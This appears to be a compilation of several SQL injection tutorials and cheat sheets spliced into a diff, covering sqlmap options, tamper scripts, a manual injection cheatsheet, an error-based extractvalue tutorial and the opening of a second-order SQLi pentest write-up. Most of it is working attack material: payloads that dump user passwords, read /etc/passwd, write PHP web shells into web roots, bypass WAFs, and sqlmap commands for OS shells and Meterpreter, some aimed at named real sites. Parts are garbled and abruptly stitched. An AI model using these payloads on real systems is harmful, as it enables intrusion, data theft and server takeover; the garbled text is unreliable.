@@ -3220,12 +3220,1568 @@ p TESTPARAMETER Testable parameter(s) --skip=SKIP Skip testing for given paramet
 
 
 
+How to use advanced SQLMap
+I will briefly talk about how to install and use SQLMap first:
+
+Seh dmoundng --batch Deh? SQLMap runs automatically and skips yes/no questions
+
+Seh dmoundng *Determine the injection location
+
+Seh dmoundng --string="String_in_the_response" Dto know which string has been successfully injected (True)
+
+
+sqlmap -u "https://anonyviet.com/s.php?q=test" -p "q"
+
+sqlmap -r request.txt
+
+sqlmap -m urls.txt
+
+sqlmap -u "http://afine.com/user/*" -H "User-agent: *"
+
+sqlmap -r request.txt --second-order "http://afine.com/avatar"
+
+
+--random-agent
+
+--batch
+
+--risk=3 --level=5
+
+
+--proxy=http://127.0.0.1:8080
+
+-v 0
+-v 4
+
+--output-dir=sqlmap
+
+--prefix "this_string_must_be_before_injection"
+
+--suffix "--this_string_must_be_at_the_end_of_injection"
+
+sqlmap -u "https://afine.com/s.php?q=1" -p 'q' --eval='q=q.replace(" ","%20")'
+
+--tamper="PATH_OR_NAME_OF_TAMPER_SCRIPT"
+
+-H "Auth_header: secret1" -H "Cookie: auth2=secret2"
+
+python sqlmap.py -r request.txt --random-agent --tamper=space2comment --time-sec=20 --level=5 --risk=3 --dbs --batch
+Request form POST: Inject into Username, then enter * in username=
+
+POST //index.php?module=user&function=login HTTP/1.1
+Host: anonyviet.com
+
+username=*&password=1
+Save the file as request.txt and put it in the sqlmap folder
+
+Request form GET:
+
+GET /admin/index.php?option=tin-sua&tin_id=1
+Host: phanthiet.terracottaresort.com
+Save the file as request.txt and put it in the sqlmap folder
+
+Use Burp Suite Pro Extension
+Download Burp Suite Pro here
+
+Request Timer – Capture timed response packets (suitable for blind sql injection).
+Request Timer burp suite
+
+Burp Bounty Pro: automatically search for security holes with Burp Suite Pro (if you need this extension, comment below, I will send it separately)
+Burp Bounty Pro
+
+sqlmap burp suite
+
+SQLiPy Sqlmap Integration bup suite
+
+Any SQLI found by SQLiPy will be added Results tab by Burp Suite.
+
+Payload SQL Injection
+Summary of Payloads to test SQL Injection is here: PayloadsAllTheThings.
+
+SQLMap CheatSheel download here: https://github.com/anonyvietofficial/sqlmap-cheatsheet
+
+Rate this post
+
+Sqlmap is a powerful tool for testing and exploiting SQL injection vulnerabilities in web applications. However, using it effectively requires knowing how to configure its options and parameters to suit different scenarios and goals. In this article, we will cover some of the best practices for configuring sqlmap options and parameters, such as:
+Top experts in this article
+Experts who add quality contributions will have a chance to be featured. Learn more
+Member profile image
+Earn a Community Top Voice badge
+Add to collaborative articles to get recognized for your expertise on your profile. Learn more
+Start a contribution
+  
+
+See what others are saying
+1
+Choosing the right injection technique
+Sqlmap supports six different injection techniques: boolean-based blind, time-based blind, error-based, UNION query, stacked queries, and out-of-band. Depending on the target application, some techniques may work better than others, or some may not work at all. You can use the -technique option to specify which technique to use, or let sqlmap detect the best one automatically. For example, to use only error-based and UNION query techniques, you can use -technique=EU.
+Add your perspective
+2
+Customizing the injection payload
+Sometimes, the default injection payload that sqlmap generates may not work properly, or may trigger some security mechanisms, such as firewalls or web application firewalls (WAFs). In that case, you may need to customize the injection payload to bypass the protection or to achieve a specific result. You can use the -prefix and -suffix options to add custom strings before and after the injection payload, or the -tamper option to apply a script that modifies the payload in some way. For example, to use a tamper script that encodes the payload with base64, you can use -tamper=base64encode.
+Add your perspective
+3
+Optimizing the performance and reliability
+Sqlmap can be a slow and noisy tool, especially when using blind injection techniques or when the target is protected by some security mechanisms. To optimize the performance and reliability of sqlmap, you can use some options and parameters that affect the speed, accuracy, and stealthiness of the tool. For example, you can use the -threads option to increase the number of concurrent HTTP requests, the --risk and --level options to adjust the trade-off between the number of tests and the chance of success, and the --delay and --random-agent options to reduce the load and fingerprint of the tool.
+Add your perspective
+4
+Extracting and dumping data
+One of the main goals of using sqlmap is to extract and dump data from the target database. Sqlmap provides various options and parameters to control what kind of data to retrieve and how to store it. For example, you can use the -D, -T, -C, and -X options to specify the database, table, column, and query to extract, or use the --dump-all option to dump all databases. You can also use the --csv option to save the output in a comma-separated values format, or the --sql-shell option to interact with the target database using SQL statements.
+Add your perspective
+5
+Exploiting advanced features
+Sqlmap offers a variety of advanced features to help you perform more complex attacks or gain more access to the target system. For example, the --os-shell and --os-pwn options allow you to execute commands or create a backdoor on the target operating system, while the --file-read and --file-write options enable you to read or write files on the target file system. Additionally, you can use the --sqlmap-shell option to launch an interactive sqlmap console, or the --wizard option to guide you through basic steps with a simple menu. To learn more about sqlmap, you can check its official documentation or use the -h or --help options to view available options and parameters.
+
+
+We have learnt the basic exploitation of Sql Injection with the help of Sqlmap in our previous posts. But there is always a step further. In this post we will see most advanced exploitation with Sqlmap.
+
+Once again 3 cheers to Kunal for helping me out for this post.
+
+In our first post of Sqlmap, we have explained few basic options of Sqlmap. We will see some more.
+
+Advanced Exploitation with Sqlmap
+Whenever I meet people and talk about any vulnerability, my first and final ask remains the same what is most extreme thing we can do by exploiting that vulnerability. In the case of SQL Injection most of my peers don’t discuss beyond downloading or altering the database. Although we can go beyond it and take the control of the application completely with the help of shell. we can run the os-commands, upload a file, read an existing file and what not.
+
+
+Advanced Options of Sqlmap
+Operating System Level Access:
+Switch	Details
+–os-cmd=OSCMD	Run operating system level commands
+–os-shell	Invoke an interactive shell for communication
+–os-pwn	Injecting a Meterpreter shell or VNC
+–os-smbrelay	One click prompt for an OOB shell, meterpreter or VNC
+–os-bof	Stored procedure buffer overflow exploitation
+–priv-esc	Database process’ user privilege escalation
+–msf-path=MSFPATH	Local path where Metasploit Framework 3 is installed
+File System Level Access:  
+There are options used to access the underlying file system of the database server.
+
+Switch	Details
+–file-read=RFILE	Read a file from the back-end DBMS file system
+–file-write=WFILE	Write a local file on the back-end DBMS file system
+–file-dest=DFILE	Back-end DBMS absolute filepath to write to
+Windows Registry Access: 
+These options used to access the back-end database management system’s Windows registry.
+Switch	Details
+–reg-read	Read a Windows registry key value
+–reg-add	Write a Windows registry key value data
+–reg-del	Delete a Windows registry key value
+–reg-key=REGKEY	Windows registry key
+–reg-value=REGVAL	Windows registry key value
+–reg-data=REGDATA	Windows registry key value data
+–reg-type=REGTYPE	Windows registry key value type
+We will see the practical implementation of few of the above ones. Lets start with running the below commands.
+
+sqlmap -r sql.txt -p item --os-cmd=ls
+
+
+sqlmap -r sql.txt -p item --os-cmd=ifconfig
+
+
+Let’s see if we can read any file on the server.
+
+sqlmap -r sql.txt -p item --read-file=/etc/passwd
+
+
+We will read the files now.
 
 
 
+This looks great ! What next, may be the shell.
+
+sqlmap -r sql.txt -p item --os-shell
+
+
+So You own the machine now. If you remember we have discussed regarding keeping the hash value for further attacks. Lets try that as well. As you can see you have got the crack of the hashes.
 
 
 
+So, In this Sqlmap series we have learnt regarding basic exploit to advanced system takeover.
+
+Do drop your valuable suggestions and feedback.
+
+What SQL Injection is and how to spot it
+SQL injection is a code injection technique for applications with a database connection. The malicious user sends a crafted SQL query to extract, add, modify, or delete data from the database.
+
+Let’s imagine that you are using the search feature of an application, using the following keyword to search: apple
+
+__https://vulnerableURL.com/images?search=apple__
+The following SQL query is sent in the background:
+
+__SELECT * from fruits WHERE name=’apple’__
+You add a single quote in your search like ?search=apple’ and the following query is sent. The query structure is broken:
+
+__SELECT * from fruits WHERE name='apple''__
+Union Select SQL Injection
+From there, the attacker writes a UNION SQL query for the search to take control of the SQL query and extract information it wasn’t intended to.
+
+__?search=apple’ UNION SELECT username, password FROM users —__
+
+__SELECT * from fruits WHERE name=’apple’’ UNION SELECT username, password FROM users —__
+In this circumstance, username and password data from the users table is extracted rather than the intended results.
+
+What is its impact?
+SQL Injections are highly critical issues as these can be used to extract complete database contents and, in some cases, can be leveraged to a Command execution on the server. Related payloads for these attacks are given in the cheatsheet below.
+
+How do I prevent SQL Injection?
+To prevent SQL Injections, ensure that proper server-side input validation is performed on all sources of user input. Various protections should be implemented using the following in order of effectiveness:
+
+Errors: Ensure that SQL errors are turned off and not reflected back to a user when an error occurs as to not expose valuable information to an attacker.
+
+Parameterize Queries: Ensure that when a userŐs input is added to a backend SQL query, it is not string appended but placed into the specific SQL parameter. The method to perform this varies from language to language.
+
+Server-Side Input Length: Limit the length of each field depending on its type. For example, a name should be less than 16 characters long, and an ID should be less than 5 characters long.
+
+Whitelist: Create character ranges (ie. Numeric, alpha, alphanumeric, alphanumeric with specific characters) and ensure that each input is restricted to the minimum length whitelist necessary.
+
+Blacklist: Disallow common injection characters such as “<>/?*()&, SQL and SCRIPT commands such as SELECT, INSERT, UPDATE, DROP, and SCRIPT, newlines %0A, carriage returns %0D, null characters %00 and unnecessary or bad encoding schemas (malformed ASCII, UTF-7, UTF-8, UTF-16, Unicode, etc.).
+
+Logging and Web Specific IDS/IPS (Intrusion Detection/Prevention System): Ensure that proper logging is taking place and is being reviewed, and any malicious traffic which generates an alert is promptly throttled and eventually blacklisted.
+
+SQL Injection Cheatsheet
+Below you will find my cheatsheet for exploiting SQL Injection:
+
+String Concatenation & Comments
+--------------|--------------------|-----------|-------------------- 
+              | MySQL              | MySQL     | PostgreSQL 
+--------------|--------------------|-----------|--------------------
+String Concat:| 'foo' 'bar'        |'foo'+'bar'| 'foo'||'bar'  
+              | CONCAT('foo','bar')|           |               
+--------------|--------------------|-----------|-------------------
+Comments:     | #                  | --        |  --           
+              | --                 | /*aaa*/   | /*aaa*/       
+              | -- -               |           |               
+              | /*aaa*/            |           |               
+--------------|--------------------|-----------|--------------------
+
+              | Oracle
+--------------|-----------------------------------------------------      
+String Concat:| 'foo'||'bar
+              | CONCAT('foo','bar')       
+--------------|-----------------------------------------------------
+Comments:     | --
+              |
+--------------|-----------------------------------------------------
+Manual Exploitation
+-----------|--------------------------------------------------------     
+Detection: | aa' --
+           | aa' #
+           | aa'/*
+           | ' or 1=1--
+           | ' or 1=1#
+           | ' or 1=1/*
+           | ') or '1'='1--
+           | ') or ('1'='1--
+-----------|--------------------------------------------------------
+Number     | ?id=1 order by <number> #
+of columns:| (Keep increasing number until you get an error, 
+           | the last number that doesn’t give you an error
+           | is the # of columns)
+-----------|--------------------------------------------------------
+Version:   | ?id=1 union select 1,version(),3,4 #
+           | id=1 UNION SELECT null,@@version,null,null
+           | id=3 and substring(@@version,1,1)=4
+           | id=3 and substring(@@version,1,1)=5
+           | id=3 union all select 1,2,@@version,4/*
+-----------|--------------------------------------------------------
+Current    | ?id=1 union select 1,2,user(),4 #
+users:     | SELECT user(); **(Mysql)**
+           | SELECT system_user(); **(Mysql, MSSQL)**
+           | SELECT user_name(); **(MSSQL)**
+           | SELECT user; **(MSSQL, PostgreSQL)**
+           | SELECT current_user; **(PostgreSQL)**
+           | SELECT user FROM dual **(Oracle)**
+           | ') or ('1'='1--
+-----------|--------------------------------------------------------
+Tables:    | ?id=2 union select 1,table_name,3,4 
+           | from information_schema.tables
+           | SELECT * FROM information_schema.tables **(MySQL)**
+           | SELECT * FROM information_schema.tables **(MSSQL)**
+           | SELECT * FROM information_schema.tables **(PostgreSQL)**
+           | SELECT * FROM all_tables **(Oracle)**
+-----------|--------------------------------------------------------
+Columns:   | ?id=2 union select 1,column_name,3,4 from 
+           | information_schema.columns where table_name='users'
+           | SELECT * FROM information_schema.columns
+           | WHERE table_name = 'table-name' **(MySQL)**
+           | SELECT * FROM information_schema.columns
+           | WHERE table_name = 'table-name' **(MSSQL)** 
+           | SELECT * FROM information_schema.columns
+           | WHERE table_name = 'table-name' **(PostgreSQL)**
+           | SELECT * FROM all_tab_columns
+           | WHERE table_name = 'table-name' **(Oracle)**
+-----------|--------------------------------------------------------
+Time-Based:| SELECT sleep(10) **(MySQL)
+           | WAITFOR DELAY ‘0:0:10’ **(MSSQL)
+           | SELECT pg_sleep(10) **(PostgreSQL)
+           | dbms_pipe.receive_message((‘a’),10) **(Oracle)
+-----------|--------------------------------------------------------
+Blind      | ?id=3
+Injection: | ?id=3 and 1=1 **(no error)
+           | ?id=3 and 1=2 **(error)
+-----------|--------------------------------------------------------
+Extracting | cat.php?id=2 union select
+Data:      | 1,**concat(**login,0x3a,password**)**,3,4 from users
+--------------------------------------------------------------------
+Reading files:
+
+‘ union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 — -
+
+‘ union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 — -
+
+‘ union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 — -
+
+‘ union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 — -
+
+--------------------------------------------------------------------
+
+Uploading files:
+
+‘ union select 1,2,3, ‘this is a test message’ ,5,6,7,8 into outfile ‘/var/www/test’ — -
+
+‘ union select 1,2,3, load_file(‘/var/www/test’) ,5,6,7,8 — -
+
+‘ union select null,null,null, “<?php system($_GET[‘cmd’]) ?>” ,5,6,7,8 into outfile ‘/var/www/shell.php’ — -
+
+‘ union select null,null,null, load_file(‘/var/www/shell.php’) ,5,6,7,8 — -
+
+--------------------------------------------------------------------
+
+Command Execution:
+
+# windows
+?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘c:/xampp/htdocs/cmd.php’
+
+# linux
+?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘/var/www/html/cmd.php’
+
+-------------------------------------------------------------------
+WAF Bypass
+-----------|--------------------------------------------------------      
+Replacing  | **/**/
+Space:     | +
+           | /*! */
+           | /*!50000 */
+           | /*!1234 */
+           | /*--*/
+-----------|--------------------------------------------------------
+Bypass     | uNiOn (change upper-lower case)
+filters for| unUNIONion (write words in the keyword)
+keywords:  | %55nIoN %53eLeCt (URL encode letters - U & S in these       
+           | cases)
+           | Add followings around the words 
+           | **/*!50000**XXXXXX***/** /*!50000UniON SeLeCt*/
+-----------|--------------------------------------------------------
+Version:   | ?id=1 union select 1,version(),3,4 #
+           | id=1 UNION SELECT null,@@version,null,null
+           | id=3 and substring(@@version,1,1)=4
+           | id=3 and substring(@@version,1,1)=5
+           | id=3 union all select 1,2,@@version,4/*
+-----------|-------------------------------------------------------- 
+# of       | **/**/**ORDER**/**/**BY**/**/**
+columns:   | **/*!**order***/+/***!by***/
+(By order) | **/*!**ORDER BY***/**
+           | **/*!50000**ORDER BY***/
+           | /*!50000**ORDER***//**//*!50000**BY***/
+           |  /*!12345**ORDER***/+/*!**BY***/**
+--------------------------------------------------------------------
+
+SQLMAP - Use Tamper Scripts to Bypass WAF:
+
+sqlmap -r login.req --dbms=mysql  --level 3 --risk 3 --timeout 100 --flush-session --technique=B --time-sec=2 --dbs --threads 10 --tamper=between,informationschemacomment,bluecoat,charencode --drop-set-cookie --fresh-queries --binary-fields -identify-waf
+
+-------------------------------------------------------------------
+SQLMAP - Tamper Scripts:
+
+tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+-------------------------------------------------------------------
+SQLMAP - MSSQL Tamper Scripts:
+
+tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+-------------------------------------------------------------------
+SQLMAP - MYSQL Tamper Scripts:
+
+tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfo
 
 
 
+Basic arguments for SQLmapGeneric-u "<URL>"-p "<PARAM TO TEST>"--user-agent=SQLMAP--random-agent--threads=10--risk=3 #MAX--level=5 #MAX--dbms="<KNOWN DB TECH>"--os="<OS>"--technique="UB" #Use only techniques UNION and BLIND in that order (default"BEUSTQ")--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts thedefault answers--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)--proxy=http://127.0.0.1:8080--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird unionchar Retrieve InformationInternal--current-user #Get current user --is-dba #Check if current user is Admin--hostname #Get hostname--users #Get usernames od DB--passwords #Get passwords of users in DB--privileges #Get privilegesDB data--all #Retrieve everything--dump #Dump DBMS database table entries--dbs #Names of the available databases--tables #Tables of a database ( -D <DB NAME> )--columns #Columns of a table ( -D <DB NAME> -T <TABLE NAME> )-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump columnInjection placeFrom Burp/ZAP captureCapture the request and create a req.txt filesqlmap -r req.txt --current-user 
+ GET Request Injectionsqlmap -u "http://example.com/?id=1" -p idsqlmap -u "http://example.com/?id=*" -p idPOST Request Injectionsqlmap -u "http://example.com" --data "username=*&password=*"Injections in Headers and other HTTP Methods#Inside cookiesqlmap -u "http://example.com" --cookie "mycookies=*"#Inside some header sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"sqlmap -u "http://example.com" --headers="referer:*"#PUT Methodsqlmap --method=PUT -u "http://example.com" --headers="referer:*"#The injection is located at the '*'Indicate string when injection is successful--string="string_showed_when_TRUE"EvalSqlmap allows the use of-e or--eval to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload beforesending it. In the following example theflask cookie session is signed by flask with theknown secret before sending it:sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session =s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dumpShell#Exec command python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami#Simple Shell python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell#Dropping a reverse-shell / meterpreter  python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwnRead File--file-read=/etc/passwdCrawl a website with SQLmap and auto-exploit
+ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts thedefault answers--crawl = how deep you want to crawl a site--forms = Parse and test formsSecond Order Injection python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3sqlmap -r 1.txt -dbms MySQL -second-order"http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbsRead this postabout how to perform simple and complex second order injections withsqlmap.Labs to practiceLearn about sqlmap by using it in the THM room:
+ TryHackMe | SQLMAP
+ TryHackMeCustomizing InjectionSet a suffix python sqlmap.py -u "http://example.com/?id=1" -p id --suffix="-- "Prefix python sqlmap.py -u "http://example.com/?id=1" -p id --prefix="') "Help finding boolean injection# The --not-string "string" will help finding a string that does not appear in True responses(for finding boolean blind injection)sqlmap -r r.txt -p id --not-string ridiculous --batchTamperRemember thatyou can create your own tamper in python and it's very simple. You canfind a tamper example in theSecond Order Injection page here.--tamper=name_of_the_tamper #In kali you can see all the tampers in /usr/share/sqlmap/tamper 
+
+
+
+ TamperDescriptionapostrophemask.pyReplaces apostrophe character with its UTF-8 full widthcounterpart
+ TamperDescriptionapostrophenullencode.pyReplaces apostrophe character with its illegal double unicodecounterpartappendnullbyte.pyAppends encoded NULL byte character at the end of payload base64encode.pyBase64 all characters in a given payload between.pyReplaces greater than operator ('>') with 'NOT BETWEEN 0AND #' bluecoat.pyReplaces space character after SQL statement with a validrandom blank character.Afterwards replace character = withLIKE operator chardoubleencode.pyDouble url-encodes all characters in a given payload (not processing already encoded)commalesslimit.pyReplaces instances like 'LIMIT M, N' with 'LIMIT NOFFSET M'commalessmid.pyReplaces instances like 'MID(A, B, C)' with 'MID(A FROMB FOR C)'concat2concatws.pyReplaces instances like 'CONCAT(A, B)' with'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'charencode.pyUrl-encodes all characters in a given payload (not processingalready encoded)charunicodeencode.pyUnicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "%u0022"charunicodeescape.pyUnicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "\u0022"equaltolike.pyReplaces all occurances of operator equal ('=') with operator'LIKE'escapequotes.pySlash escape quotes (' and ")greatest.pyReplaces greater than operator ('>') with 'GREATEST'counterparthalfversionedmorekeywords.pyAdds versioned MySQL comment before each keywordifnull2ifisnull.pyReplaces instances like 'IFNULL(A, B)' with'IF(ISNULL(A), B, A)'modsecurityversioned.pyEmbraces complete query with versioned commentmodsecurityzeroversioned.pyEmbraces complete query with zero-versioned commentmultiplespaces.pyAdds multiple spaces around SQL keywordsnonrecursivereplacement.pyReplaces predefined SQL keywords with representationssuitable for replacement (e.g. .replace("SELECT", "")) filters percentage.pyAdds a percentage sign ('%') infront of each character overlongutf8.pyConverts all characters in a given payload (not processingalready encoded)randomcase.pyReplaces each keyword character with random case valuerandomcomments.pyAdd random comments to SQL keywordssecuresphere.pyAppends special crafted stringsp_password.pyAppends 'sp_password' to the end of the payload forautomatic obfuscation from DBMS logsspace2comment.pyReplaces space character (' ') with comments
+ TamperDescriptionspace2dash.pyReplaces space character (' ') with a dash comment ('--')followed by a random string and a new line ('\n')space2hash.pyReplaces space character (' ') with a pound character ('#')followed by a random string and a new line ('\n')space2morehash.pyReplaces space character (' ') with a pound character ('#')followed by a random string and a new line ('\n')space2mssqlblank.pyReplaces space character (' ') with a random blank characterfrom a valid set of alternate charactersspace2mssqlhash.pyReplaces space character (' ') with a pound character ('#')followed by a new line ('\n')space2mysqlblank.pyReplaces space character (' ') with a random blank characterfrom a valid set of alternate charactersspace2mysqldash.pyReplaces space character (' ') with a dash comment ('--')followed by a new line ('\n')space2plus.pyReplaces space character (' ') with plus ('+')space2randomblank.pyReplaces space character (' ') with a random blank characterfrom a valid set of alternate characterssymboliclogical.pyReplaces AND and OR logical operators with their symboliccounterparts (&& andunionalltounion.pyReplaces UNION ALL SELECT with UNION SELECTunmagicquotes.pyReplaces quote character (') with a multi-byte combo %bf %27 together with generic comment at the end (to make itwork)uppercase.pyReplaces each keyword character with upper case value'INSERT'varnish.pyAppend a HTTP header 'X-originating-IP'versionedkeywords.pyEncloses each non-function keyword with versioned MySQLcommentversionedmorekeywords.pyEncloses each keyword with versioned MySQL commentxforwardedfor.pyAppend a fake HTTP header 'X-Forwarded-For
+
+After discussing Basic Injections, now we can move to XPATH injection frankly speaking this onez my favourite. Any body reading this tutorial i Suppose he read the "Complete Guide of SQL injection".
+
+Now we can continue our discussion after the Basic Union based and Bypassing Row Limit injections comes XPATH. Things to keep in mind if you landed on this page searching for Specifically XPATH Based injection then let me tell you its the wrong place. Here we are not actually injecting into XPATH, we are just using one of the XPATH function which is Extractvalue() to generate error and get the output.
+
+The &qout;ExtractValue&qout; function in MySQL runs an XPath query against a string representing XML data. The function takes input in the following form:
+
+ExtractValue('xmldatahere', 'xpathqueryhere')
+
+If the XPath query is syntactically incorrect, we are presented with an error message:
+
+XPATH syntax error: 'xpathqueryhere'
+
+Some n00bz like me may think, why we actually need this one? as we already have Union based injections!!
+
+huh!!! yeah right...but some times Different queries and web application behaviour makes is difficult to inject some injections and a web application may be just checking the input validity and not showing any output from the database. So as per the conditions we may have to use different Injection to get our way into the database.
+
+ohhh...so in what condition should i use this injection?
+
+As per my experience most of the times the condition where we start injecting with a single qoute, double quote etc we get the error, well and good. We now comment out the query and start searching for the number of columns. huh we got the columns also using order by. Let us assume there were 5 columns.
+
+Now when we inject Union Based injection, what the F..?? we cant see any output there. Earlier when we used to inject we gets an output which tells us the vulnerable column to inject. So this is the condition when you can depend on XPATH injection.
+
+okay let us Start from the same condition we discussed above.5 columns found tried following Injection but no output.
+
+
+www.vuln-web.com/index.php?view=-35" union select 1,2,3,4,5--
+HTML
+
+
+As you can see the double quote over there..that means this time we are injecting into a string type query where the query is like.
+
+Query:
+
+select path from pages where view="<our_input_here>" limit 1,1;
+HTML
+
+
+So let us continue our injection using XPATH injection.
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(OUR QUERY HERE)))--
+HTML
+
+
+Getting the Current Database :
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
+Output : XPATH syntax error: ' database_name_here'
+HTML
+
+
+as we got the Database let us continue :D
+
+Getting tables in current Database:
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--
+Output : XPATH syntax error: 'table_name_here'
+HTML
+
+
+as you can see i used limit as we cannot extract long data which limits upto 32 characters. So i prefer :P to go one by one increasing the row to get the output. well if you want to dump the database go for any tool or manual proxy else create your own script to get the data dumped for you which I prefer to be the best option.
+
+So Now lets assume we got the following tables using the above Query:
+
+Posts
+Assets
+Banner
+Links
+Users
+
+
+Let us continue and try to get the columns:
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--
+Output : XPATH syntax error: 'column_name_here'
+HTML
+
+
+Let Us say we got the 3 Columns:
+
+id
+username
+password
+
+
+Let us Dump the data from them, but before that lets count the number of Columns.
+
+Counting the number of columns:
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))--
+Output : XPATH syntax error: 'count_will_come_here'
+HTML
+
+
+You can use the same trick to count the tables or columns also. So now let us continue dumping the data
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--
+Output : XPATH syntax error: 'Output_here'
+HTML
+
+
+If you have problem understand Limit or any other thing...i suggest to read the basics again.
+Because whatever I used new I explained, what I dint explained was basics which I already covered earlier
+
+Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper
+ August 1, 2017  Mehmet Ince  Application Security
+Web applications evolved in the last century from simple scripts to single page applications. Such complex web applications are prone to different types of security vulnerabilities. One type of vulnerability, named as secondorder, occurs when an attack payload is first stored by the application on the web server and then later on used in a security-critical operation.
+
+
+As you can imagine, second order vulnerabilities can occur anywhere.  Not only within same application, but in completely different web applications that may have been using the same data sources. Therefore, it’s quite complicated and “almost” impossible to detect them by using automated scanners.
+
+In this blog post, I will show you one of the interesting SQLi flaws from our latest pentest project.
+
+Our Approach to Manual Pentest
+The success of an application pentest is related to understanding your target. I usually spend one or two days with my target like a regular user, so I can understand whole workflow. So I can understand whole workflow. While clicking every single thing and submitting forms, I try to stick with following naming convention for form fields.
+
+Give a number for main modules (such as invoice, news, charges etc. Things that you usually see on navigation bar)
+Let’s say you are browsing a “Ticket” module and you have form that requires a name and email.
+Username = johnticket1
+Email = johnticket1@yopmail.com
+I developed this approach myself over time. This helps me to track down the source of the data. If I see johnticket1 somewhere else during pentest -single app pentest usually takes 5-6 days – I understand where should I go back and start to thing about attack vectors for second order vulnerabilities.
+
+Initial Phase: Detection
+While browsing my target, I saw following request and response on my Burp Suite log.
+
+GET /wishlist/add/9 HTTP/1.1
+Host: targetwebapp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://targetwebapp/
+Cookie: XSRF-TOKEN=eyJpdiI6ImVmODhzTFRXV0wrdkRVV05MVTdyQ3c9PSIsInZhbHVlIjoiYWN1ZkkwRk1WMjZycTdDRjdSZFVuN3VKR3ZGQUpTWWZyYWNURmcyMzZtY1Zlc25vUDhvdk5xaFhHbXZidEUyalA2eUl4aDQzakhBQmNpWGtsN1lNXC9nPT0iLCJtYWMiOiIxZTAxOGU5YTVjZTY1NDdmNTFlNmMzZWRjNTM5M2Y3YTJiNTIyZjk0NThlZDgwYWExYjc1YjJmOWRiYWQyM2MxIn0%3D; session=eyJpdiI6ImdudzFVTGlNem1CYzlGUlY1aG1Xbnc9PSIsInZhbHVlIjoiMFZcL2ZHZTRDejlyUGlwbG5zNW5mNHpvYUZMdVFHUjVQVkpOZkI5M1UrazArMThDSzRiSURac0FmdTBpd0hXaFN5OVAxdytvMFhVNzhadzN1dU5NM013PT0iLCJtYWMiOiIyYWEzOWI5NWM4ZDBhNmQ1NzQ1NzA3ZjkwY2Q5NzI5NTc2MWU4NDk4YWY3OTkzMGM5ZmQ2YjBlYjFkMmNlZjIxIn0%3D
+X-Forwarded-For: 127.0.0.1
+True-Client-Ip: 127.0.0.1
+Connection: close
+Upgrade-Insecure-Requests: 1
+----
+HTTP/1.1 302 Found
+Date: Tue, 01 Aug 2017 07:31:12 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Cache-Control: no-cache, private
+Location: http://targetwebapp/
